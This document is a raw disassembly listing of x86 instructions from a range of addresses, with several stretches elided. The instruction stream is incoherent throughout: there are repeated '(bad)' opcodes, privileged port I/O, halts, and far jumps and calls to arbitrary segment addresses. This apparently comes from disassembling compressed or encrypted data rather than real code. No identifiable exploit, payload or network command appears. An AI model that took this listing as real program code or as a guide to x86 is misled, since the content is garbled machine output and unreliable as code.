  42dd9a:	xchg   esp,eax
  42dd9b:	pop    DWORD PTR [edi-0x1bdaf6d8]
  42dda1:	add    al,0x7b
  42dda3:	je     0x42de20
  42dda5:	push   0xffffffd3
  42dda7:	xchg   BYTE PTR [edx+ebx*2-0x3c],bl
  42ddab:	sbb    DWORD PTR [ebx],edi
  42ddad:	js     0x42ddc1
  42ddaf:	rcr    DWORD PTR [ecx],1
  42ddb1:	jp     0x42ddfc
  42ddb3:	xchg   esi,eax
  42ddb4:	je     0x42ddb6
	...
  42de16:	out    0x82,al
  42de18:	lods   eax,DWORD PTR ds:[esi]
  42de19:	xor    ebp,ebp
  42de1b:	aas    
  42de1c:	(bad)  
  42de1d:	xlat   BYTE PTR ds:[ebx]
  42de1e:	jns    0x42ddf6
  42de20:	mov    ebp,0xaf7d2207
  42de25:	dec    esp
  42de26:	sub    bl,0x1
  42de29:	add    BYTE PTR [edi],al
  42de2b:	add    DWORD PTR [eax],eax
  42de2d:	add    ch,cl
  42de2f:	in     eax,dx
  42de30:	shl    BYTE PTR [eax+0x57],1
  42de33:	mov    cl,0x3c
  42de35:	sbb    edx,DWORD PTR [edx]
  42de37:	inc    esi
  42de38:	sub    al,0xcf
  42de3a:	popa   
  42de3b:	mov    ds,WORD PTR [ebx+0x285b4ed0]
  42de41:	sub    ch,ch
  42de43:	ins    BYTE PTR es:[edi],dx
  42de44:	in     eax,dx
  42de45:	stc    
  42de46:	cmp    al,0x65
  42de48:	js     0x42de21
  42de4a:	lods   al,BYTE PTR ds:[esi]
  42de4b:	popf   
  42de4c:	hlt    
  42de4d:	lahf   
  42de4e:	in     eax,0xee
  42de50:	adc    al,0x63
  42de52:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  42de54:	pop    esp
  42de55:	loope  0x42de1e
  42de57:	hlt    
  42de58:	outs   dx,DWORD PTR ds:[esi]
  42de59:	mov    esi,0x5e06155c
  42de5e:	adc    DWORD PTR [ecx-0x71],0x7b
  42de62:	mov    esp,0xf5986b37
  42de67:	xlat   BYTE PTR ds:[ebx]
  42de68:	lea    edx,[ebx-0x49]
  42de6b:	je     0x42de6e
  42de6d:	mov    edx,0x1bbe619d
  42de72:	mov    ch,0x3a
  42de74:	sbb    eax,0x34c77d61
  42de79:	loope  0x42de95
  42de7b:	shl    DWORD PTR [edx-0x72],0xe6
  42de7f:	lds    ebx,FWORD PTR [ebp-0x62]
  42de82:	lock popf 
  42de84:	stos   DWORD PTR es:[edi],eax
  42de85:	mov    ds:0x4ca34250,eax
  42de8a:	stc    
  42de8b:	mov    ah,0x88
  42de8d:	add    eax,0x93a31ed4
  42de92:	adc    ah,BYTE PTR [ecx-0x33]
  42de95:	rcl    DWORD PTR [ebx+0x118eb101],1
  42de9b:	mov    al,ds:0x5b88bb1d
  42dea0:	lods   al,BYTE PTR ds:[esi]
  42dea1:	pop    ds
  42dea2:	(bad)  
  42dea3:	shl    DWORD PTR [ebx+eax*1],1
  42dea6:	loope  0x42debb
  42dea8:	push   eax
  42dea9:	pop    ds
  42deaa:	sbb    ah,BYTE PTR [ecx-0x2c063e40]
  42deb0:	inc    esi
  42deb1:	xor    bl,ah
  42deb3:	xchg   ebx,eax
  42deb4:	mov    ebp,0x84500845
  42deb9:	out    0x5b,al
  42debb:	jae    0x42debc
  42debd:	jns    0x42df1d
  42debf:	(bad)  
  42dec0:	call   0xcf623c42
  42dec5:	pop    esi
  42dec6:	xor    al,0x1e
  42dec8:	lods   al,BYTE PTR ds:[esi]
  42dec9:	mov    BYTE PTR [ecx],dh
  42decb:	jmp    0x5852:0x7cb143c2
  42ded2:	dec    edx
  42ded3:	icebp  
  42ded4:	or     al,0x8b
  42ded6:	outs   dx,DWORD PTR ds:[esi]
  42ded7:	mov    dh,0xae
  42ded9:	out    0xb,eax
  42dedb:	jno    0x42df09
  42dedd:	xor    al,0x96
  42dedf:	fst    QWORD PTR [eax-0x7c32cc83]
  42dee5:	xchg   edx,eax
  42dee6:	(bad)  
  42dee7:	sti    
  42dee8:	cs jae 0x42df2d
  42deeb:	sub    eax,0xee0b4245
  42def0:	inc    ebp
  42def1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42def2:	pop    esp
  42def3:	adc    ch,ah
  42def5:	out    0xf0,al
  42def7:	popa   
  42def8:	push   0x5047b669
  42defd:	mov    dl,0xd0
  42deff:	and    al,0x14
  42df01:	ret    0x43ee
  42df04:	xor    DWORD PTR [ebx],ebp
  42df06:	lods   al,BYTE PTR ds:[esi]
  42df07:	cmp    ebx,DWORD PTR [esi-0x55ea0981]
  42df0d:	pop    eax
  42df0e:	mov    edx,0xc6c0e34d
  42df13:	fsubr  DWORD PTR [ebx+0x79b0cb51]
  42df19:	lock xchg esi,eax
  42df1b:	leave  
  42df1c:	(bad)  
  42df1d:	sti    
  42df1e:	jle    0x42df51
  42df20:	push   ss
  42df21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42df22:	or     cl,BYTE PTR [ecx]
  42df24:	add    eax,0x95fa9cfd
  42df29:	stos   DWORD PTR es:[edi],eax
  42df2a:	dec    edi
  42df2b:	dec    edi
  42df2c:	int    0x94
  42df2e:	and    al,0x2b
  42df30:	aaa    
  42df31:	popf   
  42df32:	ins    BYTE PTR es:[edi],dx
  42df33:	and    al,0x3e
	...
  42df95:	add    BYTE PTR [edx],al
  42df97:	(bad)  
  42df98:	jb     0x42df40
  42df9a:	(bad)  
  42df9b:	scas   al,BYTE PTR es:[edi]
  42df9c:	(bad)  
  42df9d:	inc    BYTE PTR [esi]
  42df9f:	out    dx,al
  42dfa0:	dec    eax
  42dfa1:	out    dx,eax
  42dfa2:	cwde   
  42dfa3:	jl     0x42df4d
  42dfa5:	mov    edx,0x1ec87
  42dfaa:	pop    es
  42dfab:	add    DWORD PTR [eax],eax
  42dfad:	add    BYTE PTR [eax-0x76],ch
  42dfb0:	mov    ebx,0x93e32558
  42dfb5:	test   DWORD PTR [eax-0x10],edx
  42dfb8:	sbb    BYTE PTR [eax-0x5b],al
  42dfbb:	aad    0xbf
  42dfbd:	in     al,dx
  42dfbe:	fimul  WORD PTR [ebp-0x4f]
  42dfc1:	sti    
  42dfc2:	add    al,0xcf
  42dfc4:	push   ebp
  42dfc5:	or     ch,dl
  42dfc7:	std    
  42dfc8:	dec    ebp
  42dfc9:	aaa    
  42dfca:	inc    esi
  42dfcb:	(bad)  [ecx+ebp*2]
  42dfce:	sub    eax,ebp
  42dfd0:	arpl   WORD PTR [edx-0x70],dx
  42dfd3:	and    cl,ah
  42dfd5:	jle    0xe1cb6cf6
  42dfdb:	in     al,0x77
  42dfdd:	add    al,BYTE PTR [ebp-0x3d]
  42dfe0:	pop    eax
  42dfe1:	(bad)  
  42dfe2:	pop    edx
  42dfe3:	jp     0x42e061
  42dfe5:	sub    edi,DWORD PTR [esi+ebp*8]
  42dfe8:	leave  
  42dfe9:	inc    esi
  42dfea:	(bad)  
  42dfeb:	push   ss
  42dfec:	pop    edi
  42dfed:	jne    0x42e05e
  42dfef:	stos   BYTE PTR es:[edi],al
  42dff0:	mov    edi,gs
  42dff2:	loope  0x42e00e
  42dff4:	xor    bl,BYTE PTR [edi]
  42dff6:	push   cs
  42dff7:	jns    0x42dfa9
  42dff9:	mov    ebp,0xccf23e89
  42dffe:	or     DWORD PTR [edx-0x5381562],edi
  42e004:	call   0xb6fd:0x82625163
  42e00b:	inc    ebp
  42e00c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e00d:	sbb    eax,0x44127430
  42e012:	js     0x42e081
  42e014:	sub    eax,0xe16bd9a4
  42e019:	push   ebp
  42e01a:	aam    0xc
  42e01c:	mov    bl,0x52
  42e01e:	xor    DWORD PTR [edi],ebx
  42e020:	call   0x4f04:0xa6860e14
  42e027:	xor    al,0x15
  42e029:	das    
  42e02a:	adc    ah,ah
  42e02c:	jge    0x42e032
  42e02e:	call   0xf29f:0xbaaba5c6
  42e035:	jmp    0x7bf4:0xb9df81b4
  42e03c:	dec    esp
  42e03d:	mov    al,0xe6
  42e03f:	push   edi
  42e040:	push   ecx
  42e041:	xchg   esi,eax
  42e042:	jnp    0x42dff9
  42e044:	dec    esp
  42e045:	cmp    DWORD PTR [ebx+0x220cce3b],ebx
  42e04b:	sub    al,0x4a
  42e04d:	mov    esi,DWORD PTR ds:0x6db9c0f4
  42e053:	pop    ebp
  42e054:	int    0x62
  42e056:	pop    ss
  42e057:	cmc    
  42e058:	lds    ebx,FWORD PTR [ecx]
  42e05a:	fs xor al,0xbe
  42e05d:	fcom   DWORD PTR [ebx-0x53218b94]
  42e063:	mov    edi,0xb71b7caa
  42e068:	jge    0x42e00b
  42e06a:	mov    ecx,0x12d3eaaa
  42e06f:	loope  0x42e0bf
  42e071:	shl    BYTE PTR [esi],0x41
  42e074:	inc    ebx
  42e075:	inc    eax
  42e076:	stc    
  42e077:	lods   eax,DWORD PTR ds:[esi]
  42e078:	into   
  42e079:	push   0xffffffb6
  42e07b:	and    esi,ebx
  42e07d:	sbb    eax,0xee7ca63a
  42e082:	mov    ebx,0x1e630c80
  42e087:	push   ebx
  42e088:	push   ss
  42e089:	daa    
  42e08a:	or     BYTE PTR [esi],bl
  42e08c:	bound  ebx,QWORD PTR [esi+0x19]
  42e08f:	cli    
  42e090:	pop    ds
  42e091:	mov    bl,0xdf
  42e093:	int3   
  42e094:	xchg   ebx,eax
  42e095:	push   0x2e
  42e097:	aaa    
  42e098:	ins    DWORD PTR es:[edi],dx
  42e099:	xor    dl,BYTE PTR [ebx+edx*2]
  42e09c:	inc    eax
  42e09d:	xchg   esi,eax
  42e09e:	jmp    0x42e047
  42e0a0:	push   0x1f
  42e0a2:	cmp    edx,DWORD PTR [edx+ebp*8-0x7bc8f002]
  42e0a9:	dec    esi
  42e0aa:	and    bh,BYTE PTR [eax+eax*4-0x1ad07468]
  42e0b1:	loope  0x42e0ec
  42e0b3:	loope  0x42e0cc
	...
  42e115:	add    BYTE PTR [ecx+0x7e061ecf],ah
  42e11b:	xlat   BYTE PTR ds:[ebx]
  42e11c:	mov    ecx,0xcf7f7fef
  42e121:	(bad)  
  42e122:	sbb    dl,BYTE PTR [ebp+eax*8-0x21]
  42e126:	mov    gs,ebp
  42e128:	add    DWORD PTR [eax],eax
  42e12a:	pop    es
  42e12b:	add    DWORD PTR [eax],eax
  42e12d:	add    BYTE PTR [eax-0x52],bh
  42e130:	scas   eax,DWORD PTR es:[edi]
  42e131:	sbb    DWORD PTR [ecx-0x6d9042bc],ebx
  42e137:	push   0xf7100497
  42e13c:	sbb    al,0xa7
  42e13e:	add    eax,0x1912c94f
  42e143:	xchg   edx,eax
  42e144:	mov    cl,0xb7
  42e146:	adc    bl,BYTE PTR [esi+0x22]
  42e149:	rol    BYTE PTR [edx],0x5a
  42e14c:	ds add ebp,edi
  42e14f:	int    0x36
  42e151:	adc    edi,0x1c16e505
  42e157:	add    al,ch
  42e159:	cmp    eax,0x31b0a45a
  42e15e:	inc    ebp
  42e15f:	mov    ds:0xc5b2621b,al
  42e164:	xchg   edx,eax
  42e165:	cmc    
  42e166:	push   edi
  42e167:	dec    ecx
  42e168:	lea    esi,[ecx+0x68be7bf6]
  42e16e:	lods   al,BYTE PTR ds:[esi]
  42e16f:	in     eax,0xda
  42e171:	(bad)  
  42e172:	sbb    eax,0x17d92671
  42e177:	arpl   di,cx
  42e179:	pusha  
  42e17a:	aaa    
  42e17b:	mov    bh,0x5e
  42e17d:	xor    BYTE PTR [edi-0x17],ch
  42e180:	push   es
  42e181:	(bad)  
  42e182:	and    al,0x13
  42e184:	cmp    BYTE PTR [edi+0x536b3d83],ah
  42e18a:	test   BYTE PTR [ebp+0x56],bl
  42e18d:	jno    0x42e188
  42e18f:	push   ebp
  42e190:	out    dx,al
  42e191:	mov    dl,0x83
  42e193:	pop    ds
  42e194:	push   0xffffff9c
  42e196:	adc    cl,bl
  42e198:	std    
  42e199:	pop    esi
  42e19a:	mov    ?,edi
  42e19c:	add    edi,DWORD PTR [eax-0x52]
  42e19f:	or     dh,BYTE PTR [eax]
  42e1a1:	xchg   ebx,eax
  42e1a2:	mov    ch,0x43
  42e1a4:	and    BYTE PTR [ebx],dl
  42e1a6:	(bad)  
  42e1a7:	out    dx,al
  42e1a8:	push   edi
  42e1a9:	inc    eax
  42e1aa:	out    dx,eax
  42e1ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e1ac:	add    al,0xf9
  42e1ae:	cmp    edx,esi
  42e1b0:	xchg   ebp,eax
  42e1b1:	push   esp
  42e1b2:	mov    ecx,0x3c0c2810
  42e1b7:	cmp    dh,al
  42e1b9:	jne    0x42e1e8
  42e1bb:	aad    0xff
  42e1bd:	mov    eax,ds:0x5fb1d372
  42e1c2:	cwde   
  42e1c3:	sbb    BYTE PTR [esp+eax*4+0x1abe24e3],al
  42e1ca:	push   ds
  42e1cb:	add    ebp,DWORD PTR [edx]
  42e1cd:	ja     0x42e24c
  42e1cf:	and    BYTE PTR [ecx+0x31],ah
  42e1d2:	test   al,0xd9
  42e1d4:	not    edi
  42e1d6:	sub    DWORD PTR ds:0xb57f2f68,0xffffffdd
  42e1dd:	mov    eax,ds:0x78026d57
  42e1e2:	jbe    0x42e20f
  42e1e4:	adc    eax,0x764134ab
  42e1e9:	mov    ah,0x3d
  42e1eb:	mov    al,0x8
  42e1ed:	push   edx
  42e1ee:	and    bh,BYTE PTR [esi+0x13ffa454]
  42e1f4:	adc    dl,BYTE PTR [ecx]
  42e1f6:	push   ds
  42e1f7:	(bad)  
  42e1f9:	lods   al,BYTE PTR ds:[esi]
  42e1fa:	mov    al,ds:0x62edaf5
  42e1ff:	xor    eax,0xc46c027d
  42e204:	push   edx
  42e205:	cmp    DWORD PTR [esi+ebx*4-0x22],esi
  42e209:	(bad)
  42e20e:	imul   esp,ebp,0xf388545f
  42e214:	popf   
  42e215:	push   ecx
  42e216:	xchg   ecx,eax
  42e217:	sbb    bh,ah
  42e219:	gs xchg ebp,eax
  42e21b:	sar    BYTE PTR ds:0xe89f3c56,cl
  42e221:	jbe    0x42e230
  42e223:	pop    ebx
  42e224:	or     ebp,edi
  42e226:	retf   
  42e227:	out    0x6b,eax
  42e229:	lds    esp,FWORD PTR [edx-0x9205528]
  42e22f:	test   BYTE PTR [edi-0x31],cl
  42e232:	(bad)  
  42e233:	(bad)  
  42e234:	mov    bl,0x0
	...
  42e296:	lods   eax,DWORD PTR ds:[esi]
  42e297:	cmp    eax,0xb79aa78a
  42e29c:	lods   eax,DWORD PTR ds:[esi]
  42e29d:	aas    
  42e29e:	mov    al,0xd4
  42e2a0:	mov    edi,0xfb8bdbf2
  42e2a5:	call   0x107:0x1ee95
  42e2ac:	add    BYTE PTR [eax],al
  42e2ae:	cwde   
  42e2af:	sbb    ch,dl
  42e2b1:	clc    
  42e2b2:	cs add ch,ah
  42e2b5:	xchg   edx,eax
  42e2b6:	neg    DWORD PTR [ebp-0x20]
  42e2b9:	hlt    
  42e2ba:	jns    0x42e299
  42e2bc:	pop    edi
  42e2bd:	jge    0x42e2a8
  42e2bf:	shr    BYTE PTR [edi],cl
  42e2c1:	sbb    al,0x5e
  42e2c3:	cmp    BYTE PTR [edi+0x3b0f15f0],0x6b
  42e2ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e2cb:	or     al,0x37
  42e2cd:	ja     0x42e2e1
  42e2cf:	aaa    
  42e2d0:	and    ch,dh
  42e2d2:	rcr    DWORD PTR [ecx-0x7466db20],cl
  42e2d8:	mov    eax,0x90152c01
  42e2dd:	mov    dh,0xe9
  42e2df:	sbb    edx,DWORD PTR [ebx-0x37]
  42e2e2:	ss sti 
  42e2e4:	xchg   BYTE PTR [eax],bl
  42e2e6:	test   eax,0x519bfb87
  42e2eb:	fcomip st,st(5)
  42e2ed:	push   edx
  42e2ee:	call   0xf23:0xe396d02c
  42e2f5:	icebp  
  42e2f6:	icebp  
  42e2f7:	mov    ch,0x87
  42e2f9:	adc    al,0x56
  42e2fb:	and    al,0x0
  42e2fd:	sbb    eax,0x93654f91
  42e302:	pop    es
  42e303:	cmp    BYTE PTR [esi+0x856467c],0x7a
  42e30a:	not    DWORD PTR [edx]
  42e30c:	push   es
  42e30d:	and    BYTE PTR [edi],ch
  42e30f:	pop    ss
  42e310:	out    dx,al
  42e311:	mov    eax,ds:0xb62e2ff
  42e316:	pop    edx
  42e317:	call   0x1e75a63d
  42e31c:	and    bh,BYTE PTR [ebp+0x67897e60]
  42e322:	mov    ebx,0xb074e41
  42e327:	mov    edx,0x805a3142
  42e32c:	retf   0x555d
  42e32f:	ret    
  42e330:	xchg   DWORD PTR [ebp-0x49a70d9b],esi
  42e336:	daa    
  42e337:	inc    edx
  42e338:	maskmovq mm3,(bad)
  42e339:	neg    DWORD PTR ds:0x699effc
  42e33f:	jecxz  0x42e390
  42e341:	bound  edx,QWORD PTR [esi]
  42e343:	es mov edi,0x14433d3b
  42e349:	(bad)  [edi-0x135d321d]
  42e34f:	push   ebp
  42e350:	imul   ebp,DWORD PTR [eax],0x865b97c0
  42e356:	mov    ecx,0x81af8742
  42e35b:	test   al,0x35
  42e35d:	mov    DWORD PTR [eax+ebx*4+0x1b],0x3c40fe9a
  42e365:	mov    BYTE PTR [ecx+0x55],bh
  42e368:	sub    ch,BYTE PTR [eax-0x6ef017b6]
  42e36e:	sub    al,0x80
  42e370:	add    DWORD PTR [edi],0xb33b9906
  42e376:	or     eax,0x3fb6f646
  42e37b:	adc    DWORD PTR [ebx+edx*4+0x524a5a2c],ebp
  42e382:	imul   edi,DWORD PTR [ebp-0x291ea4d],0xf3a8868c
  42e38c:	popa   
  42e38d:	fld    TBYTE PTR [edx+eax*4-0x22653ab9]
  42e394:	cmp    dl,BYTE PTR [ebp-0x79]
  42e397:	mov    WORD PTR [edx+0x185daeab],ss
  42e39d:	repz stc 
  42e39f:	test   DWORD PTR [ebx],0xeab96c2e
  42e3a5:	pop    ebx
  42e3a6:	ins    DWORD PTR es:[edi],dx
  42e3a7:	mov    eax,ds:0x7a8fffb3
  42e3ac:	ins    DWORD PTR es:[edi],dx
  42e3ad:	push   ds
  42e3ae:	push   ecx
  42e3af:	xor    DWORD PTR [ebp-0x7],esp
  42e3b2:	retf   0x607b
	...
  42e415:	add    dl,ah
  42e417:	mov    ebp,0xe7dfc7dc
  42e41c:	sti    
  42e41d:	mov    ebp,0x348341d6
  42e422:	mov    cl,bh
  42e424:	shl    DWORD PTR [edx],0x9c
  42e427:	out    dx,eax
  42e428:	add    DWORD PTR [eax],eax
  42e42a:	pop    es
  42e42b:	add    DWORD PTR [eax],eax
  42e42d:	add    BYTE PTR [ebp-0x357c0134],ah
  42e433:	mov    ebx,0xe43a55b3
  42e438:	add    BYTE PTR [ebx+0x780852b9],cl
  42e43e:	cmp    bl,cl
  42e440:	pop    ebp
  42e441:	adc    esi,DWORD PTR [edi-0x76b9955c]
  42e447:	ficomp WORD PTR [ebx-0x38]
  42e44a:	mov    DWORD PTR [ecx],0x70dfcc13
  42e450:	fldpi  
  42e452:	std    
  42e453:	fs inc eax
  42e455:	out    0xce,eax
  42e457:	jmp    0xbedd:0xde3076b1
  42e45e:	loopne 0x42e3fa
  42e460:	repnz xor DWORD PTR [ebx+0x1c],ebx
  42e464:	inc    ecx
  42e465:	and    BYTE PTR [esi],0x98
  42e468:	int3   
  42e469:	scas   eax,DWORD PTR es:[edi]
  42e46a:	aas    
  42e46b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e46c:	jne    0x42e481
  42e46e:	mov    ds:0x4f09e676,al
  42e473:	sti    
  42e474:	out    dx,eax
  42e475:	push   ss
  42e476:	into   
  42e477:	retf   
  42e478:	adc    bl,BYTE PTR [edi-0x51c2e5dd]
  42e47e:	call   0x8d21427b
  42e483:	repz retf 
  42e485:	inc    eax
  42e486:	and    BYTE PTR [ebp+0x4b4fd1ed],ch
  42e48c:	add    ah,dh
  42e48e:	push   ebx
  42e48f:	sub    al,0x5e
  42e491:	fist   DWORD PTR [ecx+0x7]
  42e494:	pop    edi
  42e495:	push   ecx
  42e496:	jl     0x42e4bc
  42e498:	add    DWORD PTR [edi],ebp
  42e49a:	popf   
  42e49b:	ret    
  42e49c:	int3   
  42e49d:	jns    0x42e508
  42e49f:	data16 mov ah,BYTE PTR [ebx-0x4b]
  42e4a3:	mov    ch,0xc0
  42e4a5:	push   eax
  42e4a6:	mov    al,0xa1
  42e4a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e4a9:	adc    al,0x82
  42e4ab:	dec    eax
  42e4ac:	mov    ch,0x3a
  42e4ae:	jns    0x42e471
  42e4b0:	fiadd  WORD PTR [edx+eiz*8+0x20]
  42e4b4:	sti    
  42e4b5:	jg     0x42e4b5
  42e4b7:	sar    ecx,0x38
  42e4ba:	fs stos DWORD PTR es:[edi],eax
  42e4bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e4bd:	push   0x2d3223db
  42e4c2:	push   edx
  42e4c3:	les    ecx,FWORD PTR [ecx+0x79]
  42e4c6:	or     bl,BYTE PTR [eax-0x1c77c4b1]
  42e4cc:	xor    DWORD PTR [edi-0x1c],edx
  42e4cf:	mov    esp,0xd2bf2d23
  42e4d4:	mov    ah,0x8b
  42e4d6:	mov    eax,0x1b7fa8f
  42e4db:	sub    BYTE PTR [edx],dl
  42e4dd:	jae    0x42e4ac
  42e4df:	jnp    0x42e527
  42e4e1:	jne    0x42e561
  42e4e3:	push   ss
  42e4e4:	mov    ebp,0x67f4d2a9
  42e4e9:	sar    DWORD PTR [ebx-0x62],cl
  42e4ec:	lea    esp,[edx]
  42e4ee:	sar    BYTE PTR [edx-0xf],0xb3
  42e4f2:	int3   
  42e4f3:	dec    edx
  42e4f4:	sub    dh,BYTE PTR [ebx+0x7e]
  42e4f7:	mov    DWORD PTR [ebx],ebx
  42e4f9:	outs   dx,DWORD PTR ds:[esi]
  42e4fa:	adc    eax,0xd8bec96a
  42e4ff:	ins    DWORD PTR es:[edi],dx
  42e500:	repz mov edx,0xc8b36fa
  42e506:	scas   eax,DWORD PTR es:[edi]
  42e507:	pop    ebx
  42e508:	into   
  42e509:	loope  0x42e499
  42e50b:	ins    DWORD PTR es:[edi],dx
  42e50c:	stos   BYTE PTR es:[edi],al
  42e50d:	mov    ch,0x11
  42e50f:	icebp  
  42e510:	mov    eax,ds:0x414594f4
  42e515:	inc    ebp
  42e516:	push   cs
  42e517:	cmp    al,0x47
  42e519:	lods   al,BYTE PTR ds:[esi]
  42e51a:	mov    esp,0xe26fbf7d
  42e51f:	test   eax,0xfe501e84
  42e524:	das    
  42e525:	cmp    al,0x64
  42e527:	xor    ch,BYTE PTR [ecx+0x35]
  42e52a:	push   esi
  42e52b:	test   ecx,0x720563cc
  42e531:	mov    eax,0xe0724e
	...
  42e596:	push   ebp
  42e597:	cmp    dh,cl
  42e599:	adc    bh,ch
  42e59b:	neg    bh
  42e59d:	jge    0x42e5e9
  42e59f:	mov    DWORD PTR [ebx],ecx
  42e5a1:	stc    
  42e5a2:	fwait
  42e5a3:	fwait
  42e5a4:	xor    esi,DWORD PTR [edx]
  42e5a6:	mov    ds:0x70001f0,eax
  42e5ab:	add    DWORD PTR [eax],eax
  42e5ad:	add    BYTE PTR [edi-0x6],ch
  42e5b0:	call   0x9e9c:0x94972c6c
  42e5b7:	mov    edx,DWORD PTR [ebp+ebx*1+0x67eb06b1]
  42e5be:	(bad)  
  42e5bf:	mov    bl,al
  42e5c1:	add    ebp,ebx
  42e5c3:	push   ebp
  42e5c4:	pop    eax
  42e5c5:	mov    dl,0x85
  42e5c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e5c8:	push   ss
  42e5c9:	enter  0x9291,0x9b
  42e5cd:	inc    ebp
  42e5ce:	pop    edi
  42e5cf:	aaa    
  42e5d0:	push   edx
  42e5d1:	add    eax,0x7d5c4dd7
  42e5d6:	jmp    0x564885d7
  42e5db:	push   ebx
  42e5dc:	dec    edi
  42e5dd:	or     al,0x48
  42e5df:	enter  0x2202,0xe2
  42e5e3:	cli    
  42e5e4:	pop    ebx
  42e5e5:	in     eax,dx
  42e5e6:	add    ecx,DWORD PTR [eax+esi*2-0x538dd54f]
  42e5ed:	(bad)  
  42e5ef:	fwait
  42e5f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e5f1:	loop   0x42e5df
  42e5f3:	push   ss
  42e5f4:	push   0x31
  42e5f6:	dec    edx
  42e5f7:	sbb    eax,0xbc42672f
  42e5fc:	(bad)  
  42e5fd:	not    DWORD PTR [ebp+edi*4-0x6f96303a]
  42e604:	repz cmp BYTE PTR [esi+edi*4-0x57],bl
  42e609:	cmp    al,0x5d
  42e60b:	pcmpgtd mm7,mm7
  42e60e:	mov    bh,0xc6
  42e610:	test   al,0x80
  42e612:	jnp    0x42e630
  42e614:	sub    edi,DWORD PTR [edx+0x209b7c93]
  42e61a:	cwde   
  42e61b:	inc    esi
  42e61c:	cmp    BYTE PTR [esi+0x5ac2a9c0],bl
  42e622:	aaa    
  42e623:	out    dx,eax
  42e624:	bound  ecx,QWORD PTR [esi+0x29]
  42e627:	mov    ch,0x1f
  42e629:	inc    edi
  42e62a:	jmp    0x42e64b
  42e62c:	ss ja  0x42e64a
  42e62f:	jl     0x42e5dc
  42e631:	mov    ch,BYTE PTR [edx]
  42e633:	mov    bh,ch
  42e635:	(bad)  
  42e636:	jecxz  0x42e5dd
  42e638:	mov    BYTE PTR [ebx],dh
  42e63a:	retf   0x516d
  42e63d:	inc    edx
  42e63e:	shl    BYTE PTR [ebp+0x8e06b1b],cl
  42e644:	cmp    eax,0xd16d1340
  42e649:	in     al,dx
  42e64a:	pop    eax
  42e64b:	retf   0x81e2
  42e64e:	and    eax,0x7ae2125d
  42e653:	add    eax,0xaf0426e2
  42e658:	sub    BYTE PTR [esi+0x57],cl
  42e65b:	pop    ds
  42e65c:	mov    esp,0x473f8440
  42e661:	fstp   TBYTE PTR ds:0x2c36f05d
  42e667:	adc    esi,DWORD PTR [esi-0x5a]
  42e66a:	xor    al,0xa8
  42e66c:	lods   al,BYTE PTR ds:[esi]
  42e66d:	jmp    0x59c1:0x63e7909e
  42e674:	and    DWORD PTR [ecx+0x3c930a9e],0xa76dee01
  42e67e:	int    0x83
  42e680:	shl    BYTE PTR [ecx],0xef
  42e683:	fnstenv ds:0x2167c9f1
  42e689:	pop    esp
  42e68a:	cwde   
  42e68b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e68c:	sub    DWORD PTR [ebx+0x3f28808],esi
  42e692:	int3   
  42e693:	(bad)  
  42e694:	ds enter 0xe1e6,0x40
  42e699:	std    
  42e69a:	dec    edi
  42e69b:	(bad)  
  42e69c:	mov    dl,0x4a
  42e69e:	pop    bp
  42e6a0:	scas   al,BYTE PTR es:[edi]
  42e6a1:	mov    ebx,DWORD PTR [eax+0x7b]
  42e6a4:	mov    edx,0xfbb3f59f
  42e6a9:	rcr    DWORD PTR [eax+0x7e13b234],0x8e
  42e6b0:	aad    0x65
  42e6b2:	adc    al,0x87
  42e6b4:	pop    ss
	...
  42e715:	add    BYTE PTR [edx+0x39],bl
  42e718:	dec    esi
  42e719:	sub    eax,0x7f7b7f6f
  42e71e:	scas   al,BYTE PTR es:[edi]
  42e71f:	xor    BYTE PTR [edx+0x4c],bl
  42e722:	rcr    BYTE PTR [edx-0x54],cl
  42e725:	pop    es
  42e726:	stos   BYTE PTR es:[edi],al
  42e727:	icebp  
  42e728:	add    DWORD PTR [eax],eax
  42e72a:	pop    es
  42e72b:	add    DWORD PTR [eax],eax
  42e72d:	add    BYTE PTR [ecx+0x3f],dh
  42e730:	xor    ebx,DWORD PTR [esi-0x352b2566]
  42e736:	sub    al,0x16
  42e738:	fdivr  st,st(5)
  42e73a:	push   esp
  42e73b:	ror    BYTE PTR [eax],cl
  42e73d:	jmp    0x42e732
  42e73f:	(bad)  
  42e740:	mov    ecx,0x8320f771
  42e745:	cmp    eax,0xf112a5fc
  42e74a:	loopne 0x42e797
  42e74c:	es lock inc esi
  42e74f:	xchg   edx,eax
  42e750:	jl     0x42e746
  42e752:	(bad)  
  42e753:	jmp    0x36a7:0xee5cd570
  42e75a:	lods   eax,DWORD PTR ds:[esi]
  42e75b:	(bad)  
  42e75c:	mov    edx,0xf785cac2
  42e761:	out    0x4b,al
  42e763:	cwde   
  42e764:	rol    dh,0xce
  42e767:	cdq    
  42e768:	and    cl,BYTE PTR [esi+0xd]
  42e76b:	(bad)  
  42e76c:	sar    esp,cl
  42e76e:	mov    bl,bl
  42e770:	es icebp 
  42e772:	mov    bh,0x95
  42e774:	data16 jle 0x42e7bf
  42e777:	cmp    ebp,DWORD PTR [eax]
  42e779:	xchg   esp,eax
  42e77a:	scas   eax,DWORD PTR es:[edi]
  42e77b:	out    0xaa,al
  42e77d:	(bad)  [ecx]
  42e77f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e780:	into   
  42e781:	add    esp,DWORD PTR [edx-0x23]
  42e784:	sbb    DWORD PTR [esi-0x4f],edx
  42e787:	mov    cl,0x41
  42e789:	enter  0xac93,0xd8
  42e78d:	sti    
  42e78e:	inc    edi
  42e78f:	loop   0x42e76b
  42e791:	fbld   TBYTE PTR [ecx+ecx*4]
  42e794:	enter  0x767e,0x59
  42e798:	retf   
  42e799:	hlt    
  42e79a:	loopne 0x42e7de
  42e79c:	fild   WORD PTR [ebx+0x4259fb50]
  42e7a2:	outs   dx,BYTE PTR ds:[esi]
  42e7a3:	lods   eax,DWORD PTR ds:[esi]
  42e7a4:	adc    DWORD PTR [edi-0x5b],edx
